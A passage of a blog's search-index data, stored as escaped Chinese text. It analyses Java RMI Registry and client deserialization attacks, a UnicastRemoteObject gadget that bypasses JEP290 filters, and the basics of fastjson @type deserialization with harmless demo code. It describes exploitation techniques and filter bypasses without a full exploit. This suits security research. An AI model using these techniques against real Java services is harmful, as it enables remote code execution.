<p>\u5728\u8fd9\u91cc\u6211\u4eec\u770b\u5230\u4e86\u719f\u6089\u7684readObject\u51fd\u6570\uff0c\u5176\u7528\u4e8e\u5c06\u524d\u9762\u7684Exception\u8fdb\u884c\u53cd\u5e8f\u5217\u5316\u3002</p> <p>\u5230\u8fd9\u91cc\u5c31\u53ef\u4ee5\u4e32\u8d77\u6765\u4e86\uff0cClient\u53d1\u8d77RMI\u8fde\u63a5\uff0c\u8fde\u63a5\u5230\u6211\u4eec\u7684\u6076\u610fListener\u4e0a\u9762\u3002\u800c\u6211\u4eec\u7684Listener\u5c06\u8fd4\u56de\u4e00\u4e2a\u6784\u9020\u597d\u7684Exception\uff0c\u65e8\u5728Client\u63a5\u6536\u5230ExceptionalReturn\u7684\u4fe1\u53f7\u65f6\u8fdb\u884c\u8fd8\u539f\uff0c\u4ece\u800c\u9020\u6210\u4e86RMI Client\u7aef\u4e5f\u53d7\u5230\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u7684\u653b\u51fb\u3002</p>","tags":["Java"]},{"location":"blog/2020/rmi-registry-security-problem-20200206/#0x06","title":"0x06 \u603b\u7ed3","text":"<p>\u524d\u6587\u4e3b\u8981\u8bb2\u8bc9\u4e86RMI\u7684\u76f8\u5173\u53cd\u5e8f\u5217\u5316\u95ee\u9898\uff0c\u5305\u62ecRMI Registry\u548cRMI Client\u63a5\u6536\u5230\u53cd\u5e8f\u5217\u5316\u6570\u636e\u65f6\u4ea7\u751f\u7684\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u3002</p> <p>\u5168\u6587\u6240\u4f7f\u7528\u7684JDK\u7248\u672c\u4e3aJDK8\uff0c\u5728\u5206\u6790\u8fc7\u7a0b\u4e2d\uff0c\u53d1\u73b0\u5728\u6700\u8fd1\u7684JDK8u\u7248\u672c\u4e0a\uff0c\u5df2\u65e0\u6cd5\u5bf9RMI Registry\u53d1\u8d77\u653b\u51fb\uff0c\u4f46\u5176\u5728JDK8u232_b09\u4e4b\u524d\u7684\u7248\u672c\u8fd8\u662f\u53ef\u4ee5\u7684\u3002</p> <p>\u672c\u6587\u4e3b\u8981\u653b\u51fb\u7684\u662fRMI Registry\uff0c\u800cRMI\u7684\u653b\u51fb\u9762\u4e0d\u5355\u5355\u6587\u4e2d\u63d0\u5230\u7684\u8fd9\u79cd\u65b9\u5f0f\uff0c\u8fd8\u5b58\u5728</p> <ol> <li>\u9488\u5bf9codebase\u7684\u653b\u51fb\u89c1https://github.com/vulhub/vulhub/blob/master/java/rmi-codebase/README.md\uff0c\u52a0\u8f7d\u6211\u4eec\u6784\u9020\u597d\u7684class\u3002\u5f53\u7136\u73b0\u5728\u8fd9\u79cd\u60c5\u51b5\u6bd4\u8f83\u5c11\u4e86\u3002</li> <li>\u9488\u5bf9\u7ed1\u5b9a\u7684\u5371\u9669obj\u7684\u653b\u51fb\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7list\u6240\u6709\u7ed1\u5b9a\u7684obj\uff0c\u67e5\u627e\u5371\u9669\u7684\u7ed1\u5b9a\u5730\u5740\u8fdb\u884c\u653b\u51fb\u3002\u8fd9\u91cc\u7684\u5371\u9669\u600e\u4e48\u5b9a\u4e49\u5462\uff1f\u7b2c\u4e00\u662f\u7ed1\u5b9a\u7684\u5bf9\u8c61\u786e\u5b9e\u5b58\u5728\u64cd\u4f5c\u7cfb\u7edf\u547d\u4ee4\u7b49\uff1b\u7b2c\u4e8c\u662f\u8be5\u5bf9\u8c61\u7684\u7c7b\u51fd\u6570\u53c2\u6570\u4e2d\u5b58\u5728\u53cd\u5e8f\u5217\u5316\u70b9\uff0c\u6bd4\u5982hello(HashTable xxx)\uff0c\u5176\u4e2d\u7684HashTable\u662fCommonsCollections7\u7684\u89e6\u53d1\u70b9\uff0c\u5728\u4f20\u9012\u8fc7\u7a0b\u4e2d\uff0cxxx\u4f1a\u88ab\u5e8f\u5217\u5316\uff0c\u5230\u4e86RMI Server\u65f6\u4f1a\u53cd\u5e8f\u5217\u5316\uff0c\u4e5f\u5c31\u6267\u884c\u4e86\u6211\u4eec\u7684payload\u3002\u6700\u540e\uff0c\u8fd9\u91cc\u6682\u65f6\u8fd8\u6ca1\u627e\u5230\u6848\u4f8b...</li> </ol>","tags":["Java"]},{"location":"blog/2020/rmi-registry-security-problem-20200206/#0x07-20200303-unicastremoteobject-gadget","title":"0x07 20200303\u66f4\u65b0 UnicastRemoteObject Gadget","text":"<p>\u8fd9\u4e2aGadget\u7684\u6765\u6e90\u662fhttps://mogwailabs.de/blog/2020/02/an-trinhs-rmi-registry-bypass/</p> <p>\u7ecf\u8fc7\u6d4b\u8bd5\uff0c\u8fd9\u4e2aGadget\u53ef\u4ee5\u505a\u5230\u8ddfJRMPClient\u4e00\u6837\u7684\u6548\u679c\uff0c\u4f46\u662f\u65e0\u6cd5\u8ddf\u4e0a\u9762\u7684Level2\u4e00\u6837\u7ed5\u8fc7\u9650\u5236\uff0c\u539f\u56e0\u770b\u4e0b\u9762</p> <p>\u672c\u5730\u5728bind\u6216rebind\u4e00\u4e2aRemote\u5bf9\u8c61\u65f6\uff0c\u4f1a\u5728sun/rmi/server/MarshalOutputStream.java#replaceObject\u8fdb\u884c\u8f6c\u5316</p> <p></p> <p></p> <p>\u539f\u6765\u7684\u5bf9\u8c61\u4f1a\u88ab\u8f6c\u5316\u6210\u4e0a\u9762\u7684\u4e00\u4e2a\u7ed3\u6784\uff0c\u8fd9\u91cc\u76f4\u63a5\u4e22\u6389\u4e86UnicastRemoteObject\uff0c\u81ea\u7136\u5728Registry\u7aef\u65e0\u6cd5\u4eceUnicastRemoteObject\u7684readObject\u51fd\u6570\u5f00\u59cb\uff0c\u8fd9\u6837\u8fd9\u4e2aGadget\u5c31\u65e0\u6cd5\u6210\u529f\u5229\u7528\u4e86\u3002</p> <p>\u8981\u60f3\u5229\u7528\u8fd9\u4e2a\u94fe\u6765\u7ed5\u8fc7\u9650\u5236\uff0c\u6211\u4eec\u53ef\u80fd\u5f97\u81ea\u5df1\u5199\u4e00\u4e2abind\u7684\u8fc7\u7a0b\u624d\u53ef\u4ee5\uff0c\u628agetTarget\u7684\u8fc7\u7a0b\u53bb\u6389\u76f4\u63a5\u53d1\u8fc7\u53bb\u3002\u8fd9\u4e2aGadget\u5229\u7528\u4ef7\u503c\u6bd4\u8f83\u4f4eXD</p> <p>ps\uff1a\u8c8c\u4f3c\u53ef\u4ee5\u901a\u8fc7\u91cd\u5199\u7684\u65b9\u5f0f\u6765\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\uff0c\u8fd9\u91cc\u6709\u7a7a\u518d\u5206\u6790XD</p>","tags":["Java"]},{"location":"blog/2020/rmi-registry-security-problem-20200206/#20200617-unicastremoteobject-gadget","title":"20200617 \u66f4\u65b0UnicastRemoteObject Gadget","text":"<p>\u524d\u9762\u5728\u505a\u5206\u6790\u65f6\uff0c\u53d1\u73b0\u5728\u4f7f\u7528\u8fd9\u4e2a\u5229\u7528\u94fe\u7684\u65f6\u5019\uff0c\u5728\u53d1\u8fc7\u53bb\u4e4b\u524d\u5c31\u4f1a\u88ab\u66ff\u6362UnicastRef\u7684\u95ee\u9898\uff0c\u5bfc\u81f4\u6211\u4eec\u53d1\u5230Registry\u540e\u65e0\u6cd5\u8fd8\u539f\u51fa\u6b63\u786e\u7684jrmp\uff0c\u4eca\u5929\u6765\u770b\u770b\u4ed6\u662f\u600e\u4e48\u66ff\u6362\u7684</p> <p><code>java.io.ObjectOutputStream#writeObject0#1143</code></p> <pre><code>if (enableReplace) {\n  Object rep = replaceObject(obj);\n  if (rep != obj &amp;&amp; rep != null) {\n    cl = rep.getClass();\n    desc = ObjectStreamClass.lookup(cl, true);\n  }\n  obj = rep;\n}\n</code></pre> <p>\u4ece<code>call.getOutputStream()</code>\u83b7\u53d6\u5230\u7684outputstream\u5728\u5199\u5165\u5177\u4f53\u7684object\u65f6\uff0c\u540e\u7eed\u4f1a\u6267\u884c\u5230\u524d\u9762\u7684\u4ee3\u7801\u4e0a\uff0c\u5224\u65ad\u662f\u5426\u9700\u8981enableReplace\uff08\u9ed8\u8ba4\u662ftrue\uff09\uff0c\u6240\u4ee5\u4f1a\u9ed8\u8ba4\u8d70\u5230\u6211\u57283\u6708\u4efd\u65f6\u5206\u6790\u7684\u5730\u65b9\uff0c\u628a\u6211\u4eec\u60f3\u8981\u7684jrmp\u8fde\u63a5\u7ed9\u66ff\u6362\u6389\u4e86\u3002</p> <p>\u6240\u4ee5\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\u7684\u65b9\u6848\u5c31\u662f\u5c06\u8fd9\u4e2aenableReplace\u7ed9\u7f6e\u4e3afalse\uff0c\u8fd9\u91cc\u5b9e\u73b0\u8d77\u6765\u5c31\u6bd4\u8f83\u7b80\u5355\u4e86\uff0c\u6211\u4eec\u53ef\u4ee5\u76f4\u63a5\u5bf9outputstream\u505a\u53cd\u5c04\u8c03\u7528\uff0c\u66ff\u6362true\u4e3afalse\uff0c\u5177\u4f53\u5b9e\u73b0\u89c1L34</p> <p>\u8fd9\u91cc\u9700\u8981\u63d0\u4e00\u70b9\u7684\u662f\u8fd9\u6761\u94fe\u5de7\u5999\u4e4b\u5904\u5728\u4e8e</p> <ol> <li>UnicastRemoteObject\u5229\u7528\u94fe\u7528\u5230\u7684\u5bf9\u8c61\u90fd\u662f\u5728Registry\u53ef\u53cd\u5e8f\u5217\u5316\u7684\u767d\u540d\u5355\u91cc\u7684</li> <li>\u8ddf\u524d\u9762\u51e0\u4e2a\u5c01\u88c5unicastref\u7684\u601d\u8def\u4e0d\u540c\uff0cUnicastRemoteObject\u5b9e\u9645\u4e0a\u662f\u4e3b\u52a8\u5411\u5916\u53d1\u51fajrmp\u8fde\u63a5\u7684\u65b9\u5f0f\uff0c\u800c\u4e0d\u662f\u524d\u9762\u901a\u8fc7incomingtable\u8868\u7684\u65b9\u5f0f\u53bb\u89e6\u53d1jrmp\u8fde\u63a5</li> </ol> <p>\u4e3a\u4ec0\u4e48\u8bf4\u4ed6\u5de7\u5999\u5462\uff1f\u5728&gt;=8u232_b09\u7248\u672c\u5b58\u5728\u4e24\u4e2a\u9650\u5236\uff08\u5177\u4f53\u89c10x04\uff09</p> <ol> <li>\u6d88\u9664\u4e86\u5c01\u88c5unicastRef\u7684\u5a01\u80c1</li> <li>\u5728DGC\u5c42\u6dfb\u52a0\u4e86\u767d\u540d\u5355\u7684\u65b9\u5f0f\uff0c\u5bfc\u81f4\u5c31\u7b97jrmp\u80fd\u53cd\u94fe\u4e5f\u4e0d\u80fd\u53cd\u5e8f\u5217\u5316\u51fa\u767d\u540d\u5355\u4e4b\u5916\u7684\u7c7b</li> </ol> <p>\u800cUnicastRemoteObject\u7ed5\u8fc7\u4e86\u4e0a\u9762\u7684\u4e24\u4e2a\u9650\u5236</p> <ol> <li>\u9996\u5148\u5bf9\u4e8e\u7b2c\u4e00\u4e2a\u9650\u5236\uff0cUnicastRemoteObject\u7684jrmp\u53cd\u8fde\u53d1\u751f\u5728readObject\u8fc7\u7a0b\u4e2d</li> </ol> <p></p> <ol> <li>\u5176\u6b21\u5bf9\u4e8e\u7b2c\u4e8c\u4e2a\u9650\u5236\uff0c\u524d\u9762\u63d0\u5230Registry\u80fd\u89e6\u53d1JRMP\u53cd\u8fde\u4e3b\u8981\u662f\u56e0\u4e3a\u8c03\u7528\u4e86<code>DGCClient.registerRefs</code>\u53bb\u5904\u7406</li> </ol> <p>\u800c\u8fc7\u8fd9\u4e2a\u70b9\u5c31\u9700\u8981\u53d7\u5230\u524d\u9762\u63d0\u5230\u7684DGC\u767d\u540d\u5355\u7684\u95ee\u9898\u3002\u600e\u4e48\u7ed5\u8fc7\u8fd9\u4e2a\u5730\u65b9\uff1f\u7b80\u5355\u7684\u5c31\u662f\u627e\u4e00\u4e2a\u4e0d\u7ecf\u8fc7DGCClient\u6765\u89e6\u53d1\u5373\u53ef\u3002</p> <p>\u524d\u9762\u5206\u6790&lt;8u232_b09\u65f6\uff0c\u7528\u5230\u7684RemoteObjectInvocationHandler\u7684\u65b9\u5f0f\u6765\u89e6\u53d1\uff0c\u4e0d\u8fc7\u8fd9\u91cc\u5176\u5b9e\u53ea\u7528\u5230\u4e86\u5c01\u88c5UnicastRef\u7684\u4f5c\u7528\uff08\u8fd9\u91cc\u63d0\u4e00\u4e0b\u5b9e\u9645\u89e6\u53d1\u65f6\u9700\u8981\u8c03\u7528UnicastRef.invoke\uff09\u3002UnicastRemoteObject\u5bf9\u8fd9\u4e2ahandler\u505a\u4e86\u66f4\u6df1\u5165\u7684\u5229\u7528\uff0c\u8fd9\u91cc\u7528\u5230\u4e86<code>java.rmi.server.RemoteObjectInvocationHandler#invokeRemoteMethod</code></p> <p></p> <p>\u8c03\u7528\u4e86<code>ref.invoke</code>\u89e6\u53d1jrmp\u53cd\u8fde\uff0c\u5230\u8fd9\u91cc\u90fd\u6ca1\u6709\u7ecf\u8fc7DGCClient\u7684\u8def\u5f84\uff0c\u81ea\u7136\u4e5f\u5c31\u6ca1\u6709\u767d\u540d\u5355\u7684\u9650\u5236\u3002</p> <p>\u4e0d\u8fc7\u8fd9\u6761\u94fe\u5230\u4e868u242\u4e5f\u5931\u6548\u4e86\uff0c\u4e3b\u8981\u539f\u56e0\u5728\u4e8elookup\u63a5\u53e3\u65e0\u6cd5\u518d\u53cd\u5e8f\u5217\u5316\u975estring\u7c7b\u578b\u7684object\u4e86</p> <p></p>","tags":["Java"]},{"location":"blog/2020/rmi-registry-security-problem-20200206/#0x08-rmi-dgcysoserialexpliotsjrmpclient","title":"0x08 RMI DGC\u5b9e\u73b0\u95ee\u9898(ysoserial.expliots.JRMPClient)","text":"<p>\u5728JEP290\u4e4b\u524d\uff0cRMI\u7684DGCImpl_skel#dipatch\u63a5\u6536\u5904\uff0c\u83b7\u53d6\u5230\u6570\u636e\u540e\uff0c\u76f4\u63a5readObject\u9020\u6210\u7684\u3002</p> <p></p> <p>\u5728JEP290\u4e4b\u540e\uff0c\u53cd\u5e8f\u5217\u5316\u524d\u505a\u4e86\u6821\u9a8c\uff0c\u89c1DGCImpl</p> <p></p> <p></p> <p>\u5bfc\u81f4\u4e86ysoserial\u7684exploit\u4e2d\u7684JRMPClient\u5931\u6548</p>","tags":["Java"]},{"location":"blog/2020/rmi-registry-security-problem-20200206/#0x09-20200317","title":"0x09 \u603b\u7ed3\u4e2d\u7b2c\u4e8c\u79cd\u65b9\u5f0f\u7684\u89e6\u53d1\u70b9\uff0820200317 \u66f4\u65b0\uff09","text":"<p>\u524d\u9762\u603b\u7ed3\u4e2d\u63d0\u5230\u7684\u7b2c\u4e8c\u4e2d\u65b9\u5f0f\uff1a\u901a\u8fc7\u5bfb\u627e\u53ef\u4ee5\u5229\u7528\u7684\u7ed1\u5b9a\u5bf9\u8c61\u7684\u51fd\u6570\u7684\u53c2\u6570\u8fdb\u884c\u53cd\u5e8f\u5217\u5316\u5229\u7528</p> <p>\u76f4\u63a5\u8bb2\u89e6\u53d1\u70b9<code>sun/rmi/server/UnicastServerRef.java#dispatch#338</code></p> <p></p> <p>\u5f53\u6211\u4eec\u7f16\u5199Client\u7aef\u5bf9Server\u7aef\u6302\u8f7d\u7684\u5bf9\u8c61\u8fdb\u884c\u8fdc\u7a0b\u51fd\u6570\u8c03\u7528\uff08RMI\uff09\u65f6\uff0cServer\u7aef\u4f1a\u9010\u4e00\u8fdb\u884c\uff08\u83b7\u53d6\u5230Methtod\uff0c\u89e3\u6790parameters\uff0c\u6700\u540e\u8fdb\u884cinvoke\u8c03\u7528\uff09\u3002\u800c\u5728\u89e3\u6790params\u65f6\uff08\u6211\u4eec\u8bb2\u8fc7RMI\u8fc7\u7a0b\u4e2d\uff0c\u5bf9\u8c61\u5747\u662f\u5e8f\u5217\u5316\u7684\u72b6\u6001\uff09\u6211\u4eec\u9700\u8981\u5148\u5bf9\u53c2\u6570\u5bf9\u8c61\u8fdb\u884c\u53cd\u5e8f\u5217\u5316\uff0c\u4e5f\u5c31\u662f\u7b2c338\u884c\u6240\u505a\u7684\u5de5\u4f5c\uff0c\u7ee7\u7eed\u5f80\u4e0b\u8ddf</p> <p></p> <p>\u5728\u51fd\u6570<code>unmarshalParametersUnchecked</code>\u4e2d\u5206\u522b\u5bf9\u6bcf\u4e2a\u53c2\u6570\u8fdb\u884c\u53cd\u5e8f\u5217\u5316\u8fd8\u539f</p> <p></p> <p>\u5982\u679c\u6240\u63a5\u53d7\u7684\u7c7b\u578b\u975e\u57fa\u7840\u6570\u636e\u7ed3\u6784\uff0c\u90a3\u4e48\u5c06\u76f4\u63a5\u8c03\u7528readObject\uff0c\u8fd9\u90e8\u5206\u5e76\u6ca1\u6709\u524d\u9762filter\u7684\u9650\u5236</p> <p>\u6240\u4ee5\u5982\u679c\u627e\u5230\u4e86\u4e00\u4e2aServer\u7aef\u6302\u8f7d\u7684\u5bf9\u8c61\u5b58\u5728\u51fd\u6570\u53c2\u6570\u7c7b\u578b\u4e3aObject\u3001HashTable\u7b49\u7c7b\u578b\u65f6\uff0c\u6211\u4eec\u53ef\u4ee5\u76f4\u63a5\u7a7f\u5165\u6784\u9020\u597d\u7684\u53cd\u5e8f\u5217\u5316\u5229\u7528\u94fe\u3002\u5f53\u524d\u524d\u63d0\u8fd8\u662fServer\u7aef\u7684\u73af\u5883\u4e2d\u5b58\u5728\u76f8\u5e94\u7684\u53cd\u5e8f\u5217\u5316\u5229\u7528\u94fe\u7684\u4f9d\u8d56\u3002</p>","tags":["Java"]},{"location":"blog/2020/talk-about-fastjson-deserialization-20200413/","title":"\u6d45\u8c08fastjson\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e","text":"","tags":["Java"]},{"location":"blog/2020/talk-about-fastjson-deserialization-20200413/#0x00","title":"0x00 \u524d\u8a00","text":"<p>\u6700\u8fd1\u53c8\u78b0\u4e0a\u4e86fastjson\u7684\u9898\u76ee\uff0c\u60f3\u7740\u662f\u65f6\u5019\u5206\u6790\u4e00\u6ce2\u8fd9\u4e2a\u6f0f\u6d1e\u4e86\uff0c\u8ddf\u4e0a\u5e08\u5085\u4eec\u7684\u811a\u6b65\u3002</p>","tags":["Java"]},{"location":"blog/2020/talk-about-fastjson-deserialization-20200413/#0x01","title":"0x01 \u57fa\u7840\u77e5\u8bc6","text":"","tags":["Java"]},{"location":"blog/2020/talk-about-fastjson-deserialization-20200413/#1-fastjson","title":"(1). fastjson\u7684\u57fa\u7840\u4f7f\u7528","text":"<p>fastjson\u662f\u963f\u91cc\u5df4\u5df4\u7684\u5f00\u6e90JSON\u89e3\u6790\u5e93\uff0c\u5b83\u53ef\u4ee5\u89e3\u6790JSON\u683c\u5f0f\u7684\u5b57\u7b26\u4e32\uff0c\u652f\u6301\u5c06Java Bean\u5e8f\u5217\u5316\u4e3aJSON\u5b57\u7b26\u4e32\uff0c\u4e5f\u53ef\u4ee5\u4eceJSON\u5b57\u7b26\u4e32\u53cd\u5e8f\u5217\u5316\u5230JavaBean\u3002</p> <p>\u5148\u6765\u770b\u4e00\u4e2a\u7b80\u5355\u7684\u4f8b\u5b50</p> <pre><code>public class Phone {\n\n    public String phoneNumber;\n\n    public Phone() {\n    }\n\n    public Phone(String phoneNumber) {\n        this.phoneNumber = phoneNumber;\n    }\n        @Override\n    public String toString(){\n        return this.phoneNumber;\n    }\n}\n\npublic class NewPhone extends Phone {\n    public String location;\n\n    public NewPhone(){\n    }\n\n    public NewPhone(String phoneNumber, String location) {\n        this.phoneNumber = phoneNumber;\n        this.location = location;\n    }\n\n    @Override\n    public String toString(){\n        return this.phoneNumber+\":\"+this.location;\n    }\n}\n\npublic class Person {\n\n    public String name;\n\n    public Phone phone;\n\n    public Person() {\n    }\n\n    public Person(String name, Phone phone) {\n        this.name = name;\n        this.phone = phone;\n    }\n\n    @Override\n    public String toString(){\n        return name+\":\"+phone;\n    }\n}\n</code></pre> <p>\u4e0a\u9762\u5305\u62ec\u4e863\u4e2a\u7b80\u5355\u7684\u5bf9\u8c61Person\u3001Phone\u4ee5\u53caNewPhone\uff0c\u6211\u4eec\u7528fastjson\u5c06Person\u5bf9\u8c61\u8f6c\u5316\u6210\u4e00\u4e2ajson\u5b57\u7b26\u4e32\uff0c\u5e76\u8fd8\u539f</p> <pre><code>Phone phone = new Phone(\"1234567890\");\nPerson person = new Person(\"john\", phone);\nString json = JSON.toJSONString(person);\nSystem.out.println(json);\nPerson p = JSON.parseObject(json, Person.class);\nSystem.out.println(p);\n// output \n// {\"name\":\"john\",\"phone\":{\"phoneNumber\":\"1234567890\"}}\n// john:1234567890\n</code></pre> <p>\u8c03\u7528fastjson\u7684toJSONString\u53ef\u4ee5\u8f7b\u6613\u5730\u5c06object\u8f6c\u5316\u4e3ajson\u5b57\u7b26\u4e32\uff0c\u4e5f\u53ef\u4ee5\u7528parseObject\u5c06json\u5b57\u7b26\u4e32\u8fd8\u539f\u51fa\u6765\u3002\u4f46\u662f\u8fd9\u91cc\u6709\u4e00\u4e2a\u9650\u5236\u5c31\u662f</p> <pre><code>Phone phone = new NewPhone(\"1234567890\",\"China\");\nPerson person = new Person(\"john\", phone);\nString json = JSON.toJSONString(person);\nSystem.out.println(json);\nPerson p = JSON.parseObject(json, Person.class);\nSystem.out.println(p);\n// output\n// {\"name\":\"john\",\"phone\":{\"location\":\"China\",\"phoneNumber\":\"1234567890\"}}\n// john:1234567890\n</code></pre> <p>\u5728\u4e0a\u9762\u7684\u5199\u6cd5\u4e2d\uff0c\u7531\u4e8efastjson\u4e0d\u77e5\u9053\u9700\u8981\u8fd8\u539f\u7684Person\u7684Phone\u662f\u672c\u8eab\u8fd8\u662f\u5b50\u7c7bNewPhone\uff0c\u9762\u5bf9\u8fd9\u79cd\u591a\u6001\u65b9\u5f0f\uff0cfastjson\u8fd8\u539f\u662f\u7236\u7c7b\uff0c\u800c\u4e0d\u662f\u5b50\u7c7bNewPhone\u3002\u8fd9\u610f\u5473\u7740\u6211\u4eec\u4e22\u5931\u4e86Json\u5b57\u7b26\u4e32\u4e2dphone\u7684location\u5b57\u6bb5\u3002\u8fd9\u663e\u7136\u662f\u4e0d\u53ef\u5fcd\u53d7\u7684\uff0c\u6240\u4ee5fastjson\u7ed9\u6211\u4eec\u63d0\u4f9b\u4e86\u6307\u5b9a\u8fd8\u539f\u7c7b\u7684\u5b57\u6bb5<code>@type</code>\u65b9\u6cd5</p> <pre><code>Phone phone = new NewPhone(\"1234567890\",\"China\");\nPerson person = new Person(\"john\", phone);\nString json = JSON.toJSONString(person, SerializerFeature.WriteClassName);\nSystem.out.println(json);\nPerson p = JSON.parseObject(json, Person.class);\nSystem.out.println(p);\n// output\n// {\"@type\":\"org.vultest.base.Person\",\"name\":\"john\",\"phone\":{\"@type\":\"org.vultest.base.NewPhone\",\"location\":\"China\",\"phoneNumber\":\"1234567890\"}}\n// john:1234567890:China\n</code></pre> <p>\u901a\u8fc7\u5728toJSONString\u7684\u65f6\u5019\u6307\u5b9aSerializerFeature\uff08SerializerFeature.WriteClassName\uff09\uff0c\u4f7f\u5f97\u8f6c\u5316\u540e\u7684json\u5b57\u7b26\u4e32\u591a\u4e86<code>@type</code>\u5b57\u6bb5\u3002\u8fd9\u4e2a\u5b57\u6bb5\u6307\u4ee3\u4e86\u5f53\u524d\u7c7b\u7684class\uff0c\u907f\u514d\u4e86\u4e0a\u9762\u7684\u5b50\u7c7b\u4e22\u5931\u5b57\u6bb5\u7684\u95ee\u9898\u3002\u6bd4\u5982\u4e0a\u9762\u76f4\u63a5\u6307\u5b9a\u4e86Person\u5bf9\u8c61\u7684phone\u5c5e\u6027\u7684\u7c7b\u662fNewPhone\uff0c\u8fd8\u539f\u540e\u6210\u529f\u6253\u5370\u51falocation\u3002</p> <p>\u5230\u4e86\u8fd9\u91cc\uff0c\u6211\u4eec\u53ef\u4ee5\u601d\u8003\u4e00\u4e0b\uff0c\u5982\u679c<code>@type</code>\u88ab\u6307\u5b9a\u4e3a\u67d0\u6076\u610f\u7684\u7c7b\uff0c\u662f\u5426\u4f1a\u5bfc\u81f4\u4efb\u610f\u4ee3\u7801\u6267\u884c\u7684\u6f0f\u6d1e\uff1f</p>","tags":["Java"]},{"location":"blog/2020/talk-about-fastjson-deserialization-20200413/#2fastjson","title":"(2).fastjson\u7684\u6d41\u7a0b\u7b80\u4ecb","text":"<p>\u8fd9\u91cc\u76f4\u63a5\u53c2\u8003https://paper.seebug.org/994/</p> <p>\u7528\u4e00\u4e0b\u5ed6\u5927\u7684\u6d41\u7a0b\u56fe</p> <p></p> <p>\u5177\u4f53\u7684\u5206\u6790\u8fc7\u7a0b\u770b\u4e0a\u9762\u7684\u90a3\u7bc7\u6587\u7ae0\u5373\u53ef\uff0c\u8fd9\u91cc\u63d0\u4e00\u4e0b\u5c06ASM\u52a8\u6001\u751f\u6210\u7684\u4ee3\u7801dump\u51fa\u6765\u7684\u65b9\u6cd5</p> <p>\u5728\u5206\u6790\u8fc7\u7a0b\u4e2d\uff0cASM\u52a8\u6001\u751f\u6210\u4e86\u76f8\u5e94\u7684bytecodes\uff0c\u8fd9\u91cc\u7528idea\u7684\u65ad\u70b9\u6765dump\u6e90\u7801</p> <p>\u5148\u5c06\u65ad\u70b9\u4e0b\u5728<code>com/alibaba/fastjson/parser/deserializer/ASMDeserializerFactory.java#80</code></p> <p></p> <p>\u751f\u6210\u7684bytecodes\u5728code\u91cc\uff0c\u7528\u6267\u884c\u8868\u8fbe\u5f0f\u7684\u529f\u80fd\uff0c\u6267\u884c<code>(new FileOutputStream(\"some.class\")).write(code)</code>\u5373\u53ef\u751f\u6210</p> <p></p>","tags":["Java"]},{"location":"blog/2020/talk-about-fastjson-deserialization-20200413/#3-fastjson-gettersetter","title":"(3).  fastjson \u81ea\u52a8\u8c03\u7528getter\u548csetter","text":"<p>\u7c7b\u4f3cJava\u7684\u53cd\u5e8f\u5217\u5316\u8fc7\u7a0b\u4f1a\u81ea\u52a8\u8c03\u7528readObject\u51fd\u6570\uff0cfastjson\u8fd8\u539f\u5bf9\u8c61\u65f6\u4e5f\u4f1a\u81ea\u52a8\u8c03\u7528\u4ee5\u4e0b\u51e0\u4e2a\u51fd\u6570\uff1a</p> <ul> <li>\u65e0\u53c2\u6570\u7684\u6784\u9020\u51fd\u6570</li> <li>\u7b26\u5408\u6761\u4ef6\u7684getter\u51fd\u6570</li> <li>\u7b26\u5408\u6761\u4ef6\u7684setter\u51fd\u6570</li> </ul> <p>\u8fd9\u91cc\u9700\u8981\u533a\u522b\u7684\u662ffastjson\u6240\u4f7f\u7528\u7684parse\u51fd\u6570\u548cparseObject\u51fd\u6570\u6240\u8c03\u7528\u7684\u51fd\u6570\u6761\u4ef6\u662f\u4e0d\u4e00\u6837\u7684\u3002\uff08ps\uff1a\u5e8f\u5217\u5316\u65f6\u4f1a\u8c03\u7528\u6240\u6709getters\uff09</p>","tags":["Java"]},{"location":"blog/2020/talk-about-fastjson-deserialization-20200413/#1-parse-parseobject","title":"1. parse \u548c parseObject\u7684\u533a\u522b","text":"<p>\u6765\u770b\u4e00\u4e0bparseObject\u51fd\u6570</p> <p></p> <p>\u8fd9\u91ccparseObject\u51fd\u6570\u4f1a\u9996\u5148\u8c03\u7528<code>JSON.parse</code>\u51fd\u6570\uff0c\u7136\u540e\u518d\u53bb\u8c03\u7528<code>toJSON</code>\u51fd\u6570\u3002</p> <p>\u8fd9\u91cc<code>toJSON</code>\u4f1a\u628aobj\u5957\u4e00\u5c42<code>JSONObject</code>\u5bf9\u8c61\uff0c\u4ed6\u7684\u5b9e\u73b0\u65b9\u6cd5\u662f\u5148new\u4e00\u4e2a<code>JSONObject</code>\uff0c\u628aobj\u5bf9\u8c61\u7ed9\u586b\u5145\u8fdb\u53bb\uff1b\u7136\u540e\u8c03\u7528<code>toJSONString</code>\u628a\u751f\u6210\u7684<code>JSONObject</code>\u8f6c\u5316\u4e3ajson\u5b57\u7b26\u4e32\uff1b\u6700\u540e\u518d\u8c03\u7528<code>parse</code>\u51fd\u6570\u5c06\u8fd9\u4e2ajson\u5b57\u7b26\u4e32\u7ed9\u8fd8\u539f\u3002</p> <p>\u8fd9\u91cc\u7684<code>toJSONString</code>\u662f\u6211\u4eec\u5e8f\u5217\u5316\u7684\u4e00\u4e2a\u8fc7\u7a0b\uff0c\u4ed6\u4f1a\u53bb\u8c03\u7528\u8fd9\u4e2a\u5bf9\u8c61\u7684\u6240\u6709getters\uff0c\u4e5f\u5c31\u610f\u5473\u7740<code>parseObject</code>\u51fd\u6570\u4f1a\u4e3b\u52a8\u53bb\u8c03getters\u548csetters\uff0c\u800c<code>parse</code>\u51fd\u6570\u5219\u4f1a\u8c03\u7528\u8fd9\u4e2a\u5bf9\u8c61\u7684setters\u548c\u7b26\u5408\u6761\u4ef6\u7684getters(\u8fd9\u90e8\u5206\u89c1\u540e\u6587)\u3002</p> <p>\u90a3\u4e48\u4e5f\u5c31\u610f\u5473\u7740\uff0c<code>parseObject</code>\u6bd4<code>parse</code>\u51fd\u6570\u591a\u4e86\u4e00\u4e2a\u8c03\u7528\u6240\u6709getters\u7684\u5229\u7528\u70b9\u3002</p>","tags":["Java"]},{"location":"blog/2020/talk-about-fastjson-deserialization-20200413/#2-parse","title":"2. parse\u81ea\u52a8\u8c03\u7528\u51fd\u6570\u7684\u4e3b\u8981\u903b\u8f91","text":"<p>\u63a5\u7740\u6211\u4eec\u6765\u770b\u4e00\u4e0b<code>JSON.parse</code>\u51fd\u6570\u81ea\u52a8\u8c03\u7528getters\u548csetters\u7684\u903b\u8f91\u3002</p> 